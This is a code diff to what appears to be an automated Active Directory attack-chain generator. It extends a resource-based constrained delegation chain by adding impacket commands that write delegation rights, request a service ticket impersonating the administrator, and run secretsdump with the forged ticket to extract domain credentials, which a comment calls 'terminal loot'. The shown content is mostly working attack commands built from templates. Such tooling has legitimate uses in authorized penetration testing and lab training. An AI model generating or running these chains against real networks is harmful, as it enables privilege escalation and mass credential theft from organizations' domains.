@@ -968,6 +968,11 @@ def run(report, store, ui=None):
                 # different edge name. Route to R-RBCD chain shape.
                 host_short = tgt.split(".")[0].rstrip("$")
                 fqdn = tgt if "." in tgt else f"{host_short}.{_dom_e}"
+                # iter-65: parity with the primary R-RBCD block:
+                #   - -dc-ip anchor on getST (KDC discovery on lab boxes
+                #     without functional DNS SRV lookups)
+                #   - final secretsdump step so the chain reaches its
+                #     terminal loot (was missing; chain stopped mid-way).
                 chains.append(Chain("R-RBCD", "RBCD via AddAllowedToAct",
                     f"AddAllowedToAct: {actor} -> {tgt} "
                     f"(direct RBCD -> S4U2self+U2U)",
@@ -979,9 +984,12 @@ def run(report, store, ui=None):
                         f"impacket-rbcd -delegate-from 'attacker$' "
                         f"-delegate-to '{host_short}$' -action write "
                         f"'{_dom_e}/{_owned}:{_owned_pw}'",
-                        f"impacket-getST -spn 'cifs/{fqdn}' "
+                        f"impacket-getST -spn 'cifs/{fqdn}' -dc-ip {_dc_e} "
                         f"-impersonate administrator "
                         f"'{_dom_e}/attacker$:P@ssw0rd!'",
+                        f"export KRB5CCNAME=administrator.ccache; "
+                        f"impacket-secretsdump -k -no-pass -dc-ip {_dc_e} "
+                        f"'{_dom_e}/administrator@{fqdn}'",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "WriteAccountRestrictions":
                 # iter-51: WriteAccountRestrictions = write account UAC
